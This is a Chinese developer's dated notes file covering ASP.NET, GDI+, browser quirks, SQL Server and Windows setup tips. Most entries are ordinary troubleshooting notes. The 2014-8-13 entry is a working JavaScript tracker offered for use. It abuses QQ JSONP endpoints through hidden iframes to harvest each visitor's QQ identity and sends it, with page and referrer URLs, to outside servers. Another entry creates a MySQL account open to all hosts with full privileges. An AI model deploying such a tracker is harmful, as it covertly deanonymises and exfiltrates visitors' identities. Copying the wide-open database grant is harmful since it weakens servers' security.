+ASP.NET MVC中默认是开启Session的，MVC3之前只能通过<sessionState>全局开启或关闭Session，MVC3之后可以使用SessionStateAttribute为单个控制器关闭Session，以避免由于锁定Session引发的并发问题。
+ASP.NET MVC中若没有在Global.asax中注册Session_Start且没有向Session中写入数据，则ASP.NET不发送session cookie到客户端，这将导致Session.IsNewSession总是返回true。
+注意：发送请求时调用HttpResponse.ClearHeaders()方法，会清除Set-Cookie头，导致无法向客户端发送cookie。
+
+2013-10-5【重要】
+现象：使用Graphics.DrawImage方法时抛出InvalidOperationException(Message = Object is currently in use elsewhere)
+原因：There's a lock inside GDI+ that prevents two threads from accessing a bitmap at the same time.
+      This is not a blocking kind of lock, it is a "programmer did something wrong, I'll throw an exception" kind of lock. 
+解决：确保使用Image对象在多个线程间同步，例如下面的代码：
+                this.m_autoResetEvent.WaitOne();
+                g.DrawImage(this.m_markImage, x, y, this.Width, this.Height);
+                this.m_autoResetEvent.Set();
+
+现象：执行下面的代码时，抛出异常：a generic error in GDI+
+            byte[] data = File.ReadAllBytes(@"d:\1.jpg");
+            Image image = null;
+            try {
+                using(Stream reader = new MemoryStream(data, false)) {
+                    image = Image.FromStream(reader);
+                }
+
+                try {
+                    image.Save(@"d:\2.jpg", image.RawFormat);
+                } catch(Exception ex) {
+                    Console.WriteLine("Exception {0}: {1}\r\n{2}", ex.GetType().FullName, ex.Message, ex.StackTrace);
+                }
+            } finally {
+                if(image != null) {
+                    image.Dispose();
+                }
+            }
+原因：若是使用Image.FromStream方法创建的 Image 对象，在 Image 的生存期内，必须使流保持打开。
+解决：修改为下面的代码：
+            byte[] data = File.ReadAllBytes(@"d:\1.jpg");
+            Image image = null;
+            try {
+                using(Stream reader = new MemoryStream(data, false)) {
+                    image = Image.FromStream(reader);
+                    try {
+                        image.Save(@"d:\2.jpg", image.RawFormat);
+                    } catch(Exception ex) {
+                        Console.WriteLine("Exception {0}: {1}\r\n{2}", ex.GetType().FullName, ex.Message, ex.StackTrace);
+                    }
+                }
+            } finally {
+                if(image != null) {
+                    image.Dispose();
+                }
+            }
+
+2013-10-12【重要】
+text-align属性只影响块级元素中包含的内联元素，但在IE9之前的版本中块级子元素也受到影响，例如下面的代码：
+    <div style="position: relative; width: 200px; height: 200px; background-color: #0000FF; text-align: center;">
+        <div style="width: 20%; height: 20px; background-color: #FF0000;">
+        </div>
+    </div>
+在IE6/7/8中第二个DIV居中了，在Chrome，FF和IE9/10中居左。
+
+2013-10-16
+未知Flash尺寸的情况下，如何合适的预览Flash呢？
+非IE浏览器可以设置Width="auto"和Height="auto"，此时每个浏览器会默认开辟一块区域显示Flash，Flash被等比例缩放到该区域中；IE浏览器这样设置则不显示任何内容。
+在一个限定区域中预览Flash的通用方法是：设置Width="宽度px"，不设置Height的值。
+
+2013-10-23【重要】
+在非ASP.NET管线线程中HttpContext.Current返回null的解决办法：
+1. 如果是异步操作，则将HttpContext.Current传递到异步操作对象，在异步回调方法中设置System.Runtime.Remoting.Messaging.CallContext.HostContext为传递过来的HttpContext对象；
+2. 若是启动新的线程，则在线程代码外用变量保存HttpContextCurrent的值，则在线程代码中设置System.Runtime.Remoting.Messaging.CallContext.HostContext为保存的HttpContext对象;
+
+IIS7集成模式下使用上面的方法创建UrlHelper对象后调用Action方法会抛出异常：Value does not fall winthin the expected range，解决办法：
+使用下面的代码创建新的HttpContext对象，然后再创建可用的UrlHelper对象：
+                HttpRequest request = new HttpRequest("/", "http://localhost", string.Empty);
+                HttpResponse response = new HttpResponse(new StringWriter());
+                HttpContext context = new HttpContext(request, response);
+
+                helper = new UrlHelper(new RequestContext(new HttpContextWrapper(context), new RouteData()), RouteTable.Routes);
+备注：Xphter.Framework.Web.WebHelper.CreateUrlHelper方法已应用该逻辑。
+
+2013-10-29
+在HTML的title中换行的方法：使用&#10;&#13;表示\r\n字符；
+
+2013-11-15【重要】
+ASP.NET4中关闭请求验证的方法：
+由于在ASP.NET4中，请求验证在执行ASP.NET管线之前发生，所以需要在web.config中增加配置节：<httpRuntime requestValidationMode="2.0" />
+若是WebForm，在Page中配置：<@ Page validateRequest="false" %>；
+若是MVC，在Controller/Action中添加属性[ValidateInput(false)]或在模型属性中添加属性[AllowHtml]
+参考以下文档：
+ASP.NET Request Validation
+
+The request validation feature in ASP.NET provides a certain level of default protection against cross-site scripting (XSS) attacks. In previous versions of ASP.NET, request validation was enabled by default. However, it applied only to ASP.NET pages (.aspx files and their class files) and only when those pages were executing.
+
+In ASP.NET 4, by default, request validation is enabled for all requests, because it is enabled before the BeginRequest phase of an HTTP request. As a result, request validation applies to requests for all ASP.NET resources, not just .aspx page requests. This includes requests such as Web service calls and custom HTTP handlers. Request validation is also active when custom HTTP modules are reading the contents of an HTTP request.
+
+As a result, request validation errors might now occur for requests that previously did not trigger errors. To revert to the behavior of the ASP.NET 2.0 request validation feature, add the following setting in the Web.config file:
+
+<httpRuntime requestValidationMode="2.0" />
+However, we recommend that you analyze any request validation errors to determine whether existing handlers, modules, or other custom code accesses potentially unsafe HTTP inputs that could be XSS attack vectors.
+
+2013-11-27
+sitemap协议的详细内容：http://www.sitemaps.org/protocol.html
+
+2013-12-11
+获取包含window的iframe或frame对象的方法：调用window.frameElement属性。
+
+2013-12-14【重要】
+错误情况：当使用root帐号连接MySql时，提示Host 'XXXX' is not allowed to connect to this MySQL server；
+解决办法：创建新的帐号，并在允许在所有主机下登录，代码如下：
+CREATE USER 'test'@'%' IDENTIFIED BY 'password';
+GRANT ALL PRIVILEGES ON *.* TO 'test'@'%' WITH GRANT OPTION;
+
+2013-12-17
+APM异步方法设计原则：
+1. 应该捕获在回调方法中引发的任何异常，在调用EndMethodName方法是触发；
+
+2013-12-22
+CanvasRenderingContext2D.fillText方法的y参数表示的是文本下边缘的Y坐标；
+
+2013-12-26【重要】
+现象：ASP.NET 4.0、MVC 3.0程序中提示异常：The URL-encoded form data is not valid；
+原因：.NET为了避免DOS攻击，对POST的FORM元素的个数进行了限制，默认是1000个；
+解决：在web.config中定义：<add key="aspnet:MaxHttpCollectionKeys" value="需要的数字"/>
+
+2014-1-4
+电子邮件的工作原理：http://blog.csdn.net/pathfinder163/article/details/6397226
+
+2014-2-27【重要】
+Ajax向隐形iframe提交时，若对iframe应用样式：display: none，在IE10/Above、Chrome、FireFox中会提示拒绝访问，即禁止向这样的框架提交数据。
+解决方法是：对iframe应用样式：width: 0px; height: 0px; border-style: none; visibility: hidden;
+
+2014-3-26【重要】
+U盘安装win7的方法，使用Windows 7 USB/DVD Download tool制作U盘启动镜像。
+镜像问题：使用Windows 7 USB/DVD Download tool选择ISO镜像文件时，可能得到 “所选的文件不是有效的ISO文件，请选择一个有效的ISO文件，然后再试一次”的错误提示。
+解决办法：请使用UltraISO打开ISO镜像文件，然后转到“文件>属性”，在“光盘文件系统”选项中勾选“Joliet、UDF” ，在“ISO 9660 文件名格式”选项中勾选“Max（221）”，在“Joliet文件名格式”选项中勾选“扩展（110）”，然后点击菜单“文件>保存”ISO镜像文件即可。
+
+2014-3-29【重要】
+编辑C#类，以便在C++工程中调用的方法（例如：C++编写DirectShow Filter框架，C#编写逻辑实现）：将C#类注册为COM组件，C++类中按照COM组件调用，示例如下：
+C#:
+namespace ClassLibrary1 {
+    [ComVisible(true)]
+    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    [Guid("54851B69-99B8-4632-9C17-A4E37E021815")]
+    public interface ITestClass {
+        [PreserveSig]
+        int Add(int i, int j);
+    }
+
+    [ComVisible(true)]
+    [ClassInterface(ClassInterfaceType.None)]
+    [Guid("7F60C79C-06AD-4AD1-BACA-5FDB38F7B4C3")]
+    public class TestClass : ITestClass {
+        public TestClass() {
+        }
+
+        [PreserveSig]
+        public int Add(int i, int j) {
+            return i + j;
+        }
+    }
+}
+Project Properties：
+    check Make assembly COM-Visible
+    check Register for COM Interop
+    execute: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe ClassLibrary1.dll /nologo /codebase /tlb: ClassLibrary1.tlb
+
+C++:
+    #import "{tlb file path}\ClassLibrary1.tlb" raw_interfaces_only
+
+    HRESULT hr = 0;
+    IUnknown* pOuter = NULL;
+    ClassLibrary1::ITestClass ptr = NULL;
+    CoInitialize(NULL);
+    hr = CoCreateInstance(__uuidof(ClassLibrary1::TestClass), pOuter, CLSCTX_ALL, __uuidof(ClassLibrary1::ITestClass), reinterpret_cast<void**>(&ptr));
+    int i = ptr->Add(13, 14);//Call C# method here
+    CoUninitialize();
+
+2014-3-29
+控制HttpWebRequest连接细节的方法：调用ServicePoint属性提供的服务，如下：
+ServicePoint.BindIPEndPointDelegate：控制本机适用哪个IP地址和端口进行HTTP连接；
+ServicePoint.ConnectionLeaseTimeout：控制中断连接的时间；
+
+2014-4-2【重要】
+注意：创建AsyncOperation会阻止ASP.NET管线的执行，考虑下面的代码：
+        AsyncOperation operation = AsyncOperationManager.CreateOperation(Environment.TickCount);
+        new Thread(() => {
+            operation.Post(this.Callback, null);
+            Thread.Sleep(10000);
+            operation.PostOperationCompleted(this.Callback, null);
+        }) {
+            IsBackground = true,
+        }.Start();
+
+        context.Response.Cache.SetCacheability(HttpCacheability.NoCache);
+        context.Response.ContentType = "text/plain";
+        context.Response.Write(context.Request.UserHostAddress);
+直到代码中线程执行完毕后（即10秒后），浏览器才会收到响应。
+
+2014-4-3
+对于小屏幕笔记本还原SQL数据库时，由于无法看到文件路径输入框和选择按钮，而无法选择文件路径的解决办法：
+1. 将输入焦点放在 “还原选项”-> “覆盖原有数据库”上
+2. 按7次Tab键，按一次空格键，弹出选择数据文件路径窗口；
+3. 继续按4次Tab键，按一次空格键，弹出选择日志文件路径窗口；
+4. 完毕；
+
+2014-4-4
+在ASP.NET MVC中实现Comet长轮询服务器推送的方法：
+1. 实现一个异步操作，对操作使用NoAsyncTimeout属性；
+2. 在异步操作中，开启异步逻辑，在异步逻辑中实现自己的超时机制；
+例如下面实现消息推送的代码
+控制器代码：
+        [HttpPost]
+        [NoAsyncTimeout]
+        public void QueryAsync() {
+            this.AsyncManager.OutstandingOperations.Increment();
+            MessageManager.BeginGetUnreadMessages(this.Session.SessionID, (ar) => {
+                IEnumerable<Message> messages = MessageManager.EndGetUnreadMessages(ar);
+                this.AsyncManager.Parameters["messages"] = messages;
+                this.AsyncManager.OutstandingOperations.Decrement();
+            }, null);
+        }
+
+        public ActionResult QueryCompleted(IEnumerable<Message> messages) {
+            return this.Json(messages, "application/json");
+        }
+
+MessageManager类代码：
+        public static IAsyncResult BeginGetUnreadMessages(string sessionID, AsyncCallback callback, object userState) {
+            AsyncResult<IEnumerable<Message>> result = new AsyncResult<IEnumerable<Message>>(callback, userState);
+            if(!receiver.Event.WaitOne(0)) {
+                new Thread(() => {
+                    IEnumerable<Message> data = Enumerable.Empty<Message>();
+                    //set timeout here
+                    if(receiver.Event.WaitOne(60000)) {
+                        //messages are avaliable
+                    }
+
+                    result.MarkCompleted(null, false, data);
+                }) {
+                    IsBackground = true,
+                }.Start();
+            } else {
+                IEnumerable<Message> data = null;
+                //messages are avaliable
+
+                result.MarkCompleted(null, true, data);
+            }
+
+            return result;
+        }
+
+        public static IEnumerable<Message> EndGetUnreadMessages(IAsyncResult result) {
+            return ((AsyncResult<IEnumerable<Message>>) result).End();
+        }
+
+2014-4-7
+ASP.NET MVC默认模型联编程序能够将类型为HttpPostedFileBase的模型属性和窗体值（<input name="name" type="file" />）进行绑定；
+
+2014-4-7
+带有文件上传的页面，首先择文件，然后在windows中将选择的文件删除，最后提交页面，测试浏览器响应结果：
+1. google chrome：页面崩溃，显示 This webpage is not found
+2. 其他浏览器：multipart/form-data请求体中包含空的文件内容
+
+2014-4-9【重要】
+ASP.NET MVC3中默认模型联编程序对于字节数组期望解析的是Base64编码。
+
+2014-4-28【重要】
+字符串类型的SqlParameter会自动对参数值中的单引号字符进行转义，例如参数值为：a'b，实际发送到SQL SERVER的脚本中参数值已经编码为：a''b；
+在全文搜索中，若搜索的短语包含双引号，则需要使用两个双引号进行转义；
+
+2014-4-29
+ASP.NET内联语法的区别：<%= %>不对输出进行HTML编码；<%: %>对输出进行HTML编码；
+
+2014-4-29
+IIS服务器变量SERVER_NAME和HTTP_HOST的区别：HTTP_HOST = SERVER_NAME + SERVER_PORT；
+
+2014-4-29
+.NET 4.5之前通过PreApplicationStartMethodAttribute属性和DynamicModuleUtility类支持启动应用程序前加载IHttpModule；
+.NET 4.5之后通过HttpApplication.RegisterModule方法支持运行时动态加载IHttpModule；
+
+2014-5-8
+ASP.NET MVC HtmlHelper.PasswordFor方法输出的HTML中不会包含具体的密码字符，即input元素的value值为空；
+
+2014-5-12
+1. 关于HttpWebRequest关联的HTTP连接：
+ServicePointManager.DefaultConnectionLimit管理与HTTP服务器的最大连接数，默认为2；若所有连接都被占用，则下次请求需要等待；
+若KeepAlive为false，则超过ServicePoint.MaxIdleTime后，再次使用该ServicePoint时关闭HTTP连接；
+若KeepAlive为true，则ServicePoint.MaxIdleTime无效；超过ServicePoint.ConnectionLeaseTimeout（-1表示永久打开）后，关闭HTTP连接；
+若需要每次使用完后都关闭与资源的连接，可以手动调用HttpWebRequest.Abort方法释放连接；
+若出现使用HttpWebRequest访问HTTP资源延迟很严重的情况，可以考虑增加ServicePointManager.DefaultConnectionLimit值，或将ServicePointManager.MaxServicePointIdleTime的值设置为零；
+
+2014-5-13【重要】
+VS2010创建安装程序时，系统必备选择.net 3.5sp1时发生错误的解决办法：
+1 Update the Package Data
+Open the [Program Files]\Microsoft SDKs\Windows\v6.0A\Bootstrapper\Packages\DotNetFx35SP1 folder or %ProgramFiles(x86)%\Microsoft SDKs\Windows\v6.0A\Bootstrapper\Packages\DotNetFx35SP1 on x64 operating systems
+Edit the Product.xml file in Notepad.
+Paste the following into the < PackageFiles > element: 
+<PackageFile Name="TOOLS\clwireg.exe"/>
+<PackageFile Name="TOOLS\clwireg_x64.exe"/>
+<PackageFile Name="TOOLS\clwireg_ia64.exe"/>
+Find the element for < PackageFile Name="dotNetFX30\XPSEPSC-x86-en-US.exe" and change the PublicKey value to: 3082010A0282010100A2DB0A8DCFC2C1499BCDAA3A34AD23596BDB6CBE2122B794C8EAAEBFC6D526C232118BBCDA5D2CFB36561E152BAE8F0DDD14A36E284C7F163F41AC8D40B146880DD98194AD9706D05744765CEAF1FC0EE27F74A333CB74E5EFE361A17E03B745FFD53E12D5B0CA5E0DD07BF2B7130DFC606A2885758CB7ADBC85E817B490BEF516B6625DED11DF3AEE215B8BAF8073C345E3958977609BE7AD77C1378D33142F13DB62C9AE1AA94F9867ADD420393071E08D6746E2C61CF40D5074412FE805246A216B49B092C4B239C742A56D5C184AAB8FD78E833E780A47D8A4B28423C3E2F27B66B14A74BD26414B9C6114604E30C882F3D00B707CEE554D77D2085576810203010001
+Find the element for < PackageFile Name="dotNetFX30\XPSEPSC-amd64-en-US.exe" and change the PublicKey value to the same as in step 4 above
+Save the product.xml file
+ 
+2 Download and Extract the Core Installation Files
+Navigate to the following URL: http://download.microsoft.com/download/2/0/e/20e90413-712f-438c-988e-fdaa79a8ac3d/dotnetfx35.exe
+Download the dotNetFx35.exe file to your local disk.
+Open a Command Prompt window and change to the directory to which you downloaded dotNetFx35.exe.
+At the command prompt, type: 
+dotNetFx35.exe /x:. 
+This will extract the Framework files to a folder named “WCU” in the current directory.
+Copy the contents of the WCU\dotNetFramework folder and paste them in the %Program Files%\Microsoft SDKs\Windows\v6.0A\Bootstrapper\Packages\DotNetFx35SP1 folder (%ProgramFiles(x86)%\Microsoft SDKs\Windows\v6.0A\Bootstrapper\Packages\DotNetFx35SP1 on x64 operating systems). Note: Do not copy the WCU\dotNetFramework folder itself. There should be 5 folders under the WCU folder, and each of these should now appear in the DotNetFx35SP1 folder. The folder structure should resemble the following:
+o DotNetFx35SP1 (folder)
+dotNetFX20 (folder
+dotNetFX30 (folder)
+dotNetFX35 (folder)
+dotNetMSP (folder)
+TOOLS folder)
+en (or some other localized folder)
+dotNetFx35setup.exe (file)
+
+You may now delete the files and folders you downloaded and extracted in steps 2 and 4.
+
+2014-5-16【重要】
+ASP.NET的Cache中保存的的数据，即使优先级为CachePriority.NotRemovable，也有被移除的可能；
+对于希望运行时永久保存的数据，考虑使用静态变量或ASP.NET ApplicationState；
+
+2014-5-16【重要】
+ASP.NET开发中，对于依赖Session_Start和Session_End事件的业务逻辑，不要依赖两个事件的引发顺序；
+ASP.NET启用regenerateExpiredSessionId时，默认只对无Cookie模式重新生成URL；
+对于使用过期Session Cookie的请求，ASP.NET将重用该cookie，偶尔会发生Session_Start事件早于Session_End事件发生的情况；
+若业务逻辑依赖过期会话的Session_End早于Session_Start这一假设，则会出现错误；
+
+2014-5-18【重要】
+.NET中线程同步的方法：
+1. 用户模式：volatile关键字、Interlocked类、ReaderWriterLockSlim类、Monitor类(lock关键字，即WINDOWS关键段)
+2. 内核模式：WaitHandle类结构
+3. 自旋模式：SpinLock结构、SpinWait结构；
+
+2014-5-29
+设计对象功能的时候，若要使用回调方法，使用事件或者委托的性能是一样的；
+
+2014-5-29【重要】
+解决win2003 x64系统中，无法运行使用Provider=microsoft.jet.oledb.4.0访问Access数据库的asp网站的方法：
+1下载并安装Microsoft Access Database Engine 2010 Redistributable，地址：http://www.microsoft.com/en-us/download/details.aspx?displaylang=zh&id=13255；
+2 将连接字符串，修改为：Provider=Microsoft.ACE.OLEDB.12.0；
+3 Microsoft Access Database Engine 2010 Redistributable有64位版本，IIS不需要运行在32位模式下；
+4 IIS默认运行64位模式，若当前是32位模式，使用下面的脚本恢复到64位模式：cscript.exe %SYSTEMDRIVE%\inetpub\adminscripts\adsutil.vbs SET W3SVC/AppPools/Enable32bitAppOnWin64 0
+
+2014-6-10【重要】
+主机没有安装ASP.NET MVC3时，如何部署呢？查考下面的文章：http://haacked.com/archive/2011/05/25/bin-deploying-asp-net-mvc-3.aspx/
+
+2014-6-13
+DirectShow基础类CStream.FindPin方法重写了CBaseFilter.FindPin，该方法的实现是认为输入是数字，会导致无法根据Pin名称查找。
+解决办法：重写CStream.FinPin方法，只调用CBaseFilter.FindPin方法；
+
+2014-7-7【重要】
+ASP.NET MVC4/5 Razor2/3 存在一个BUG：Not able to use @this inside code block，详情：http://aspnetwebstack.codeplex.com/workitem/458
+例如下面的代码在MVC4中提示编译错误：
+@if(true) {
+    @this.Html.Raw("<div>TEST</div>")
+}
+修改成下面的形式，解决问题：
+@if(true) {
+    @(this.Html.Raw("<div>TEST</div>"))
+}
+
+2014-7-23
+现象：VS2013中，右键点击代码中的公共方法，看不到Create Unit Tests菜单了。
+解决办法：在Tools->Extensions and Updates->Online->Search Unit Test Generator and install it.
+
+2014-7-25【重要】
+服务端包含SSI <!-- #include file="path" -->，其中path参数值可以为类似于“../common/header.inc”之类的相对路径，<!--和后面字符、-->和前面字符之间可以存在空白字符，path必须用双引号括起来，IIS6以上版本的IIS都支持该类语法。
+
+2014-7-30【重要】
+为了支持分布式架构，ASP.NET应用代码，需要避免将数据缓存到静态成员中。
+
+2014-8-13
+获取访客QQ号的客户端代码：
+var u_api = "http://218.244.129.62:8888";
+var para = document.getElementById("tongji_js");
+if (para == null) {
+    para = document.getElementById("qq_js");
+}
+var v;
+var v = para.src;
+var tmp = v.split("?");
+var ids = tmp[1];
+var u_refer = encodeURIComponent(document.referrer);
+var u_page = encodeURIComponent(document.location.href);
+var Qin_api = 'http://api.bjbmyj.com/api';
+var isIE = document.all ? true : false;
+var ie = document.all ? true : false;
+var isIE = !!window.ActiveXObject;
+function loadJS(a, b, c, d) {
+    var e = document.createElement("script");
+    e.type = "text/javascript";
+    if (c == '') {
+        e.charset = "utf-8"
+    } else {
+        e.charset = c
+    }
+    e.src = a;
+    e.onerror = function () {
+        if (d) {
+            setTimeout(d, 10);
+        }
+    };
+    if (ie) {
+        e.onreadystatechange = function () {
+            if (e.readyState) {
+                if (e.readyState == "loaded" || e.readyState == "complete") {
+                    e.onreadystatechange = null;
+                    e.onload = null;
+                    if (b) {
+                        setTimeout(b, 10);
+                    }
+                }
+            } else {
+                e.onreadystatechange = null;
+                e.onload = null;
+                if (b) {
+                    setTimeout(b, 10);
+                }
+            }
+        }
+    } else {
+        e.onload = function () {
+            if (e.readyState) {
+                if (e.readyState == "loaded" || e.readyState == "complete") {
+                    e.onreadystatechange = null;
+                    e.onload = null;
+                    if (b) {
+                        setTimeout(b, 10);
+                    }
+                }
+            } else {
+                e.onreadystatechange = null;
+                e.onload = null;
+                if (b) {
+                    setTimeout(b, 10);
+                }
+            }
+        }
+    }
+    document.getElementsByTagName('HEAD').item(0).appendChild(e)
+}
+function fangkenoLogin() {
+    xx1 = getCookie("fkqq");
+    xx2 = getCookie("fkname");
+    try {
+        if (xx1 == '' || xx1 == 'null') {
+            fangkenoLogin_do()
+        } else {
+            xx3 = '2';
+            setTimeout(xxx_third, 1);
+        }
+    } catch (e) {
+        fangkenoLogin_do()
+    }
+}
+function fangkenoLogin_api_cookie() {
+    loadJS(Qin_api + "/qq/cookie.php?u_api=" + encodeURIComponent(u_api) + "&t=" + (new Date).getTime())
+}
+function qqs_not() {
+    fangkenoLogin_do();
+}
+function fangkenoLogin_do() {
+    loadJS("http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date).getTime(), checkLoginCB)
+}
+function checkLoginCB() {
+    try {
+        if (data0.err == 1026) {
+            xx3 = '1';
+            setTimeout(loading_blog, 100)
+        } else {
+            setTimeout(fangkenoLogin, 3000)
+        }
+    } catch (e) {
+        setTimeout(fangkenoLogin, 3000)
+    }
+}
+function blog_api() {
+    loadJS(Qin_api + "/blog_url.php?u_api=" + encodeURIComponent(u_api) + "&t=" + (new Date).getTime())
+}
+function loading_blog() {
+    window.img = "<script>function gqq_callback(options) { parent.scn_sendInfo(options); };</script><script id='img' src='http://webstock.finance.qq.com/stockapp/zixuanguweb/stocklist?callback=gqq_callback&app=web&range=group'></script>";
+    var a = "frameImg" + Math.random();
+    var b = document.createElement("iframe");
+    b.src = "javascript:parent.img;";
+    b.id = a;
+    b.scrolling = "no";
+    b.setAttribute("frameborder", "0", 0);
+    b.style.width = "0px";
+    b.style.height = "0px";
+    document.body.appendChild(b);
+}
+function get_lastview() {
+    var a = new Date();
+    var b = a.getTime();
+    b = Math.round(b / 1000);
+    my_fetch_url = Qin_api + "/qq/index_json.php?u_api=" + encodeURIComponent(u_api) + "&xx1=" + xx1 + "&xx2=" + xx2 + "&tm=" + b;
+    loadJS(my_fetch_url)
+}
+function scn_sendInfo(a) {
+    try {
+        xx1 = a.data.nickname;
+        xx2 = 'Null';
+        setCookie("fkqq", xx1);
+        setCookie("fkname", xx2);
+        setTimeout(xxx_third, 1);
+    } catch (e) {
+    }
+}
+function qqs(a) {
+    xx1 = a.uin;
+    xx2 = 'Null';
+    setTimeout(xxx_third, 1)
+}
+function xxx_third() {
+    var a = document.createElement("iframe");
+    a.src = u_api + "/C-census.php?" + ids + "&xx1=" + xx1 + "&xx2=" + xx2 + "&xx3=" + xx3 + "&llurl=" + u_refer + "&thepage=" + u_page + "&t=" + (new Date).getTime();
+    a.id = "QQfangke_iframe_two";
+    a.name = "QQfangke_iframe_two";
+    a.style.width = "0px";
+    a.style.height = "0px";
+    a.scrolling = "no";
+    a.setAttribute('frameborder', '0', 0);
+    document.body.appendChild(a);
+}
+function setCookie(a, b) {
+    var c = 1000;
+    var d = new Date();
+    d.setTime(d.getTime() + c * 24 * 60 * 60 * 1000);
+    document.cookie = a + "=" + escape(b) + ";expires=" + d.toGMTString();
+}
+function getCookie(a) {
+    var b, reg = new RegExp("(^| )" + a + "=([^;]*)(;|$)");
+    if (b = document.cookie.match(reg))
+        return (b[2]);
+    else
+        return 'null'
+}
+function delCookie(a) {
+    var b = new Date();
+    b.setTime(b.getTime() - 10000);
+    document.cookie = a + "=;expire=" + b.toGMTString();
+}
+fangkenoLogin_do();
+
+2014-9-5【重要】
+SQL SERVER中使用NULL值与其他数据类型做加法运算均返回NULL值
+解决办法：使用ISNULL函数转化为期望的默认值；
+
+2014-9-11
+WINDOWS中创建点开头的文件夹技巧：新建文件夹 .名称.，保存后最后的点会消失，从而创建了以点开头的文件夹；
+
+2014-9-12【重要】
+ASP.NET对Form值和JSON成员数量有最大限制，参考：http://support.microsoft.com/kb/2661403
+解决办法：使用下面的配置修改默认值：
+        <add key="aspnet:MaxHttpCollectionKeys" value="10000"/>
+        <add key="aspnet:MaxJsonDeserializerMembers" value="10000"/>
+
+2014-9-14【重要】
+大陆访问Google的方法：修改hosts文件的方法已失效。
+https://edgecastcdn.net/00107ED/g/
+
+2014-10-3【重要】
+全球顶级域名注册商查询地址：https://www.icann.org/registrar-reports/accredited-list.html
+比较好的域名/服务器供应商：
+www.west263.com
+www.sudu.cn
+www.net.cn
+www.xinnet.com
+www.72e.net
+www.sundns.com
+www.dns.com.cn
+
+2014-10-23【重要】
+Google Chrome离线下载地址
+下载地址（英文版）：https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7B89A81C20-86DC-53EB-2B6B-8C6AAFD714AA%7D%26lang%3Den%26browser%3D4%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26installdataindex%3Ddefaultbrowser/update2/installers/ChromeStandaloneSetup.exe
+下载地址（中文版）：https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7B4430A9CA-C5F9-125E-DDC1-4F80308D1EFC%7D%26lang%3Dzh-CN%26browser%3D4%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26installdataindex%3Ddefaultbrowser/update2/installers/ChromeStandaloneSetup.exe
+下载页面：https://www.google.com/chrome/browser/desktop/index.html?standalone=1
+下载页面（英文版）：https://www.google.com/intl/en/chrome/browser/index.html?standalone=1
+下载页面（中文版）：https://www.google.com/intl/zh-cn/chrome/browser/index.html?hl=zh-CN&standalone=1
+
+2014-11-06
+C#中实现对象拷贝的约定：
+1. 浅拷贝，使用拷贝构造函数；
+2. 深拷贝，使用ICloneable接口方法；
+
+2014-11-06【重要】
+SQL中使用一个表中的数据更新另一个表的数据的方法：使用 UPDATE FROM 语句；
+SQL中为记录添加序号列的方法：使用 ROW_NUMBER() OVER () 语句；
+例如下面的SQL代码用于更新表中的序号列，其中说明了上面提到的方法
+UPDATE a
+SET a.Ordinal = b.RowNumber - 1
+FROM t_catalog AS a, (
+	SELECT ID, ROW_NUMBER() OVER (PARTITION BY ParentCatalogID ORDER BY ID ASC) AS RowNumber
+	FROM t_Catalog
+	WHERE CategoryID = 8
+) AS b
+WHERE a.ID = b.ID
+
+2014-11-11【重要】
+使用TransactionScope事务，在多个数据库中同步操作时，提示：服务器 XXX 上的 MSDTC 不可用。
+解决办法：启动 Distributed Transaction Coordinator 服务即可；
+
+2014-11-20【重要】
+使用MSDTC跨网络访问分布式事务的解决办法：
+0. 启动 Distributed Transaction Coordinator 服务；
+1. 在windows防火墙中增加c:\windows\system32\msdtc.exe例外，开放RPC 135端口；
+2. 打开控制面板 -> 管理工具 -> 组件服务 -> 我的电脑 -> 属性 -> COM安全选项卡 -> 编辑默认值，给Network Service所有权限；
+3. 打开控制面板 -> 管理工具 -> 组件服务 -> 我的电脑 -> 本地DTC -> 属性 -> 安全选项卡，勾选允许网络访问；
+4. 重启 Distributed Transaction Coordinator 服务，或，重启计算机；
+
+2014-11-21
+cursor: url(''), default;样式中的光标地址已经支持相对路径，若样式是在CSS文件中定义的，则IE相对于页面地址解析，其他浏览器相对于CSS文件地址解析，故需要把样式代码写在页面中，这样就可以兼容IE浏览器了。
+
+2015-1-2
+若form中只有一个<input type="text" />或包含一个<input type="submit" />时，输入框获取到焦点后，按回车浏览器会自动提交表单；
+只有一个text输入框时，禁用自动提交的办法：增加下面的输入元素 <input type="text" style="display: none;" />
+包含一个submit按钮时，禁用自动提交的办法：注册keydown事件，调用event.preventDefault();
+
+2015-1-16【重要】
+IE8存在一个BUG，类似于 new Date("2000-1-1") 这样的代码将会返回NaN，解决办法是替换为 new Date("2000/1/1")这样的代码。
+通过在C#中调用DateTime.ToString("yyyy/MM/dd")来获取上面的格式，结果发现在某些服务器上依然范围yyyy-MM-dd这样的格式。
+原来，系统会在ToString()时，自动读取本地计算机地区（域）等配置信息，在中文操作系统中，通常“控制面板”-->“区域及语言选项”-->“区域选项”-->“标准和格式”中的短时间，这也就是时间格式化这个“怪事”发生的原因了。
+解决办法：调用DateTime.ToString("yyyy/MM/dd", System.Globalization.DateTimeFormatInfo.InvariantInfo)，告诉.NET忽略本地配置即可。
+
+2015-1-28【重要】
+百度PC/移动站META适配的方法：
+1. 指定PC页面对应的移动页面地址：<meta name="mobile-agent"content="format=[wml|xhtml|html5]; url=url">
+2. 指定页面适合浏览的设备：<meta name="applicable-device" content="pc|mobile|pc,mobile">
+
+2015-1-29
+EcShop在PHP5.4以上版本报错，使用PHP5.2.17始终提示无法连接MySql数据库，改用PHP5.3.29后问题解决。
+
+2015-4-11
+控制XmlSerializer序列化的XML内容的方法：
+1. 缩进、是否包括XML声明等：XmlWriterSettings
+2. 命名空间：XmlSerializerNamespaces
+
+2015-5-9【重要】
+SQL SERVER分页查询：http://blog.csdn.net/qiaqia609/article/details/41445233
+示例代码如下，效率依次变低：
+-- 方法1：必须具有一个主键列
+SELECT * FROM t_BeianSubject WHERE ID IN (
+	SELECT TOP 30 a.ID FROM (
+		SELECT TOP 3030 ID, CreateTime FROM t_BeianSubject ORDER BY CreateTime DESC
+	) AS a ORDER BY a.CreateTime ASC
+) ORDER BY CreateTime DESC
+GO
+-- 方法2：SQL 2005以上版本，必须具有一个主键列
